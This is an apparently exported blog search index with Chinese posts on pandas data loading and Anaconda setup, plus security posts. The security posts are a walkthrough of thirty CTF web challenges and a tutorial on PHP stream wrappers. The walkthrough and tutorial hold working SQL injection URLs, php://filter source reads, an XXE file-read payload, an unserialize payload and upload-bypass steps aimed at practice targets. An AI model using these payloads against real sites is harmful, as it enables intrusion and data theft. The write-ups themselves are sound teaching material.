      <url>%2F2017%2F01%2F24%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[接触大数据比赛，必然要接触大数据（&lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。 基本的读入其实python里已经集成了csv模块了，不过使用起来不那么方便。一般而言，使用pandas库可以把数据读入成dataframe形式方便操作。 读入csv文件以kaggle的titanic数据集为例用pandas读入的代码如下:12import pandas as pdtitanic_db = pd.read_csv('titanic_train.csv') 这样就能把数据集读进来了，如下：几道’\’是可能因为屏幕小（，，ԾㅂԾ，，）而产生的换行提示。显示出来的有5行（0~5），每行的上面都有对应的列名。 读入txt文件以IJCAI-17比赛数据集中的user_view.txt为例notepad++打开如下：用pandas读入的代码如下:12import pandas as pduser_view = pd.read_table('user_view.txt') 注意代码应该是 read_table .结果如下可以看到读入后，pandas把txt文件的第一行当做了列名，很明显这是错误的:) 这个我们下面来进行修正。 针对无列名文件第一行的读入处理上面提到的 read_csv 、read_table 等，其实他们的参数不仅仅只有一个。为了让无列名的数据读入正确，我们可以在读入的时候多指定一个参数header=None。以user_view.txt为例。1user_view = pd.read_table('user_view.txt'，header=None) 读入结果如下： 可以看到读入后，原txt文件中的第一行有了Index（即 0），不再被识别为列名。 对txt数据集读入处理为正常的dataframe形式在指定header=None读入txt文件后，pandas自动给添了个列名 0，这表明读入的每一行其实都是读入了一字符串，总共只有 1 列！对数据的操作很不方便 所以我们在遇到这种情况时，我们还要继续指定参数sep，告诉pandas以什么为分隔符。以user_view.txt为例，从上图可知每行的数据有三个部分，用逗号(，)相隔开。所以在读入时，如下：1user_view = pd.read_table('user_view.txt'，header=None，sep='，') 可以发现每列（3列）的列名被设置为 0 1 2，这样我们可以很方便地对数据进行操作。 给无列名的数据集添加列名法一：直接操作好吧，这个方法当然是最简单的，csv用excel打开，txt用notepad++、sublime打开，然后自己填上列名，再正常读入就行了嘛! 只是通常情况下，所遇到的数据集比较大，用excel或者notepad等难以打开，又或者打开后不好操作，局限性比较大。同时在直接操作添加时还要考虑原数据集的格式和编码，方便后面进一步读入。 法二：在利用pandas读入时指定列名以user_view.txt数据集为例，阿里天池上的数据说明是 Field Sample Description user_id 0000000001 用户id shop_id 000001 商家id，与shop_info对应 time_stamp 2015-10-10 10:00:00 浏览时间 所以在读入时，我们可以再指定一个参数 names .对照上述说明和基于前面的操作()，代码如下：123import pandas as pdcolumns = ['user_id','shop_id','time_stamp']user_view_db = user_view_db = pd.read_table('user_view.txt',header=None,sep=',',names=columns) 结果如下： 法三：在用pandas读入后再制定列名在完成如前面基本的读入和处理后，此时 user_view_db 应该是 列名为[0,1,2] 的datframe了。此时我们再通过指定其属性columns来指定列名。1user_view_db.columns=['user_id','shop_id','time_stamp'] 如下：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（0）环境搭建之anaconda安装]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85%2F</url>
      <content type="text"><![CDATA[最近开始接触一些kaggle的比赛，需要搭建基本的环境。原本在本机和服务器上“搭好了”，numpy.test()等都没有问题，同样的代码却运行出了不同的结果… 后面接触到了 anaconda这个集成的python科学计算环境，一键式解决大部分问题，甚至在win下也能安装：)这样也省去了开一大堆虚拟机的麻烦。 简介网上各种简介一大堆，对我而言……scipy在win下死活没装上，不过在 anaconda 里已经很好的集成了，嗯不多说了。 下载按理我们都是去官网（https://www.continuum.io/downloads）下载，不过下载速度十分可观，不知道翻墙后能不能好点。我的方法是在浏览器下载时复制其下载链接，然后放到百度云里面离线下载，可能会出现链接失效的情况，但其实只要一直点离线下载：) 一般最后会成功的。下面这两个是我刚离线完的，目前还是最新版，各位如果需要可以保存一下。 Anaconda3-4.2.0-Windows-x86： 链接：http://pan.baidu.com/s/1hsxB3MG 密码：5k0x Anaconda3-4.2.0-Linux-x86_64.sh 链接：http://pan.baidu.com/s/1dETp0LN 密码：xm7x 这两个版本是python3，64bit的. 大家自己看着办：) 安装win平台下的安装很简单，傻瓜式操作，中间会有两个选项用来把anaconda加入系统环境变量，安装后系统环境如下： ubuntu下的安装，在虚拟机安装时挺顺利的，但在云服务器上除了一点小问题，可能跟服务器的初始环境有关吧:) 运行一下sh脚本，跟着提示来，最后一步是问是否要把anaconda加入系统环境变量，选yes一般来讲应该是能成功的。如果在最后一步时没有成功或者说输入了yes以外的值而导致无法默认运行anaconda的话，也可以按照如下做法（以云服务器上为例，这里我顺便把最基本操作写出来吧，$表示在terminal里的意思……）： $ vim /home/ubuntu/.bashrc 按键盘字母 i ， 在最后面加入一句： export PATH=/home/ubuntu/anaconda3/bin:$PATH 按键盘上 ESC ，再按 ：，输入 wq 退出vim $ source /home/ubuntu/.bashrc 如下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pwn思维导图]]></title>
      <url>%2F2017%2F01%2F13%2Fpwn%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%2F</url>
      <content type="text"><![CDATA[]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[南邮CTF平台web前30题解]]></title>
      <url>%2F2017%2F01%2F12%2F%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[1、查看源代码view-source:http://chinalover.sinaapp.com/web1/nctf{flag_admiaanaaaaaaaaaaa} 2、MD5碰撞http://115.28.150.176/md5/index.php?a=240610708nctf{md5_collision_is_easy} 3、绕过长度限制，firebug修改限制长度nctf{follow_me_to_exploit} 4、下载该gif文件，010编辑器打开， 最后nctf{photo_can_also_hid3_msg} 5、所谓层层递进，就是一层一层的慢慢找吧view-source:http://chinalover.sinaapp.com/web3/404.html nctf{this_is_a_fl4g} 6、 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#39;_&#39;)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [(ﾟｰﾟ) # (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;); 脑洞加密方式 http://www.tuicool.com/articles/2E3INnmfirebug 粘贴后 运行 nctf{javascript_aaencode} 7、看起来像是老题 burpsuit抓包 8、refer头部修改ncf{http_referer} 9、nctf{gzip_base64_hhhhhh} 10、filter方式读取源码http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php得到base64编码 并解码得到 11、burpsuit抓包， sendtorepeater 可以发现有重定向 一个个慢慢翻 nctf{this_is_302_redirect} 12、提示下载其他东西，查看源代码，发现下载连接为 download.php?url=[base64]已知的文件有 download.php 尝试下载 download.php -》 ZG93bmxvYWQucGhw 并查看所以继续下载 hereiskey.php -&gt; nctf{download_any_file_666} 13、页面提示 cookie burp抓包设置cookie为0 后发现右边出现 Login=0将cookie设置为 Login=1 nctf{cookie_is_different_from_session} 14、 访问http://chinalover.sinaapp.com/web11/robots.txt别太开心，flag不在这，这个文件的用途你看完了？在CTF比赛中，这个文件往往存放着提示信息TIP:sql.php &lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; 所以目标是 http://chinalover.sinaapp.com/web11/sql.php 参数是 id 而且其中的那个数字 1024 很奇怪啊 intval是取整函数，所以让 id等于 1024.* 比如1024.9999999 1024.0000001 则$id = intval($_GET[id]) 后 $id=1024 http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 nctf{query_in_mysql} 15、gbk 提示：宽字节注入先查 表名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,table_name from information_schema.tables%23 再查 字段名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,column_name from information_schema.columns where table_name=0x666c6167%23 查询 数据 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,fl4g from flag %23 nctf{gbk_3sqli} 资料：宽字节注入https://www.91ri.org/8611.html 16、考点是 截断 然而…… * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[0]=a &lt;-为什么这个方法可以？…… 运气 * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu %00截断 %23为 # flag:nctf{use_00_to_jieduan} 17、注意和第二题的区别，第二题是== 而这一题是 === 要求不仅仅是值相同 而且类型要相同，所以这一题不能用md5碰撞在php中 md5() 需要一个string参数，但若传入一个数组类型，它不会报错但会返回空值利用这点，我们传入两个数组进行绕过if判断http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=0 Flag: nctf{php_is_so_cool} 18、变量覆盖！ &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) { ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php } ?&gt; &lt;?php } ?&gt; extract函数“可能”导致变量覆盖漏洞，我们传入pass的值，并且把thepassword_123的值覆盖为我们需要的值 nctf{bian_liang_fu_gai!} 19、查看index.txt &lt;?php if(eregi(“hackerDJ”,$_GET[id])) { echo(“not allowed!“); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; &lt;br&gt;&lt;br&gt; Can you authenticate to this website? id 不能与 hackerDJ 相等，而且id经过 urldecode后要与 hackerDJ相同 http://php.net/manual/en/function.urldecode.php $_GET[]本身就有urldecode的功能 而且就 urlencode，是把对应的ASCII码前面加上%，urldecode就是把对应的编码还原，而未经编码的保持不变 所以对hackerDJ中的任意一个进行编码或是全部编码，效果相同 http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ %2568ackerDJ在第一个GET处被urldecode成 %68ackerDJ ,绕过了第一个if判断， 接着是 代码中的显式urldecode，被还原成 hackerDJ 从而拿到 flag 20、本地登录，上burp 添加X-Forwarded-For:127.0.0.1 nctf{happy_http_headers} 21、都已经提示header了burp抓包，查看 nctf{tips_often_hide_here} 22、查看一下源代码，看一看upload.php然后我把那张gif.gif的图片传了上去，结果这里只写一下正确姿势，其余的上传绕过日后总结，在upload这里添上 1.php .gif (php和 . 之间是 空格键产生的空格)这里的 20 就是php和 . 之间的空格利用 00 截断上传 ，把 20 修改为 00nctf{welcome_to_hacks_world} 23、点进去是 Source 代码，没有看到显式的过滤或转义， trim（）是去除两侧空格所以尝试传入user为 admin’)# 其中 ‘）用来分别用来闭合 #用来把后面给注释掉这样最后的查询语句为 select user from ctf where (user=&#39;admin&#39;) nctf{ni_ye_hui_sql?} 24、注意提示： tip:strcmp(array,string)=null=0 所以根据代码逻辑，我们传入的pass若与pass1相等，则返回0， ！strcmp则为 真 这里是关于strcmp的解释http://www.w3school.com.cn/php/func_string_strcmp.asp 利用提示，我们传入 pass数组，比如 pass[]=1, 见右上。 nctf{strcmp_is_n0t_3afe} 25、传入十六进制，可以绕过判断， 54975581388http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc nctf{follow_your_dream} 26、既然是admin的密码，怎么会是ctfuser呢…… 上burpsuit 改一改，然而不对。 注意到地址栏，user1传了一个参数：ctfuser的加密结果 进去，这个也必须改掉 所以改为 user1=YWRtaW4= 后面那串是admin的base64加密。 GO nctf{reset_password_often_have_vuln} 27、在xman训练营时有接触过某题，我们以为它的考点是反序列化，但当时没有类（class），最后只好作罢：） &lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[&#39;pass&#39;])) { $pass = $_GET[&#39;pass&#39;]; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; } else echo &quot;are you trolling?&quot;; } ?&gt; https://www.91ri.org/3960.htmlhttp://www.freebuf.com/vuls/80293.html然而有道坎实在绕不过去，那个$o-&gt;secret = “*”; 我不知道如何构造成相等……参考网上的一篇……http://115.159.210.46/archives/19.html &lt;?php class just4fun{ var $enter; var $secret; } $class =new just4fun(); $class-&gt;enter=&amp;$class-&gt;secret; print_r(serialize($class)) ?&gt;由上述代码得到最后的payload： http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}最后稍微总结一下知识点：1）反序列化漏洞，2）php在面对object传值时的“特性” nctf{serialize_and_unserialize} 28、好熟悉的感觉，看看源代码…… &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require &#39;db.inc.php&#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[&#39;username&#39;]); $password = @clean((string)$_GET[&#39;password&#39;]); $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1){ die(&#39;Invalid password!&#39;); } echo $flag; --&gt;Invalid password! 好吧 xman夏令营时原题做过了SELECT FROM users WHERE name=’admin\’ AND pass=’ or 1 #’;这样一来 name=’*‘ or 1 条件恒真所以payload是 username=admin\&amp;password=%20or%201%23 nctf{sql_injection_is_interesting} 29、jsfuck……放到firebug里直接运行一下，出来一个新页面，其内容如下图http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在header里啊,上burpsuit查看，发现tip为 history of bash. 如下左图百度了一下， 如上右图，所以试着访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 得到新提示 zip -r flagbak.zip ./* 这是吧flagbak.zip文件解压到当前目录下， 所以flagbak.zip文件有可能仍然存在 尝试访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip解压，里面有flag.txt文件，打开，得到flag。 nctf{bash_history_means_what} 30、 &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39;$user&#39;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) { echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;; } else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); } } ntcf{union_select_is_wtf}]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[浅谈php伪协议及在CTF比赛中的应用]]></title>
      <url>%2F2007%2F06%2F22%2F%E6%B5%85%E8%B0%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%9C%A8CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%2F</url>
      <content type="text"><![CDATA[file://利用该协议可以访问本地文件系统，从而可能读取到敏感文件。 直接使用以wechall上的一题为例：1http://www.wechall.net/challenge/crappyshare/index.php?show=code 第215行开始，有如下代码：12345678910111213141516171819202122232425&lt;?php 省略function upload_please_by_url($url)&#123; if (1 === preg_match('#^[a-z]&#123;3,5&#125;://#', $url)) # Is URL? &#123; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FAILONERROR, true); if (false === ($file_data = curl_exec($ch))) &#123; htmlDisplayError('cURL failed.'); &#125; else &#123; // Thanks upload_please_thx($file_data); &#125; &#125; else &#123; htmlDisplayError('Your URL looks errorneous.'); &#125;&#125;省略?&gt; curl_exec($ch)中的$ch可控，原本是希望能curl到远程服务器上的资源，但这里可以利用file：//读取到本地敏感文件。1http://www.wechall.net/challenge/crappyshare/crappyshare.php 结合其他方法比如XXE中，经常使用它来引入外部实体符号。比如以下payload：123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///c://TEST.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 更详细的内容可以见：小试XML实体注入攻击 php://http://cn2.php.net/manual/zh/wrappers.php.php 访问各个输入/输出流（I/O streams） php://filter读取文件这个经常在ctf比赛中用来读取源码，返回的是base64加密后的结果。假设index.php源码如下：1234&lt;?php @include($_GET["chybeta"]); show_source(__FILE__);?&gt; 利用php://filter读取index.php源码1http://XXX/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 有时候也可以直接用以下payload：1http://XXX/index.php?file==php://filter/resource=index.php php://input基本利用php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。 16年华山杯，源码如下：123456789101112&lt;?php$user = $_GET["user"];$file = $_GET["file"];$pass = $_GET["pass"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is admin"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //class.php&#125;else&#123; echo "you are not admin ! ";&#125;?&gt; 可以利用php：//input。如下： 类似的题目，在jarvisoj的IN A mess可见到。 代码执行利用条件：allow_url_include = On。不过其实若allow_url_include = On 的话就可以直接远程文件包含了：）。测试代码同上。12url: http://localhost:20000/index.php?chybeta=php://inputpost: &lt;? phpinfo() ?&gt; 若没有开启allow_url_include，则会执行失败。 http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLs zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流 expect://用于处理交互式的流。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[chybetaのdiary]]></title>
      <url>%2F1999%2F11%2F30%2Fchybeta%E3%81%AEdiary%2F</url>
      <content type="text"><![CDATA[just chybeta の diary or notes or not 2018-07-07 《深入分析Java Web技术内幕》第9章 Servlet工作原理解析 买了去杭州的机票233]]></content>
    </entry>

    
  
  
</search>
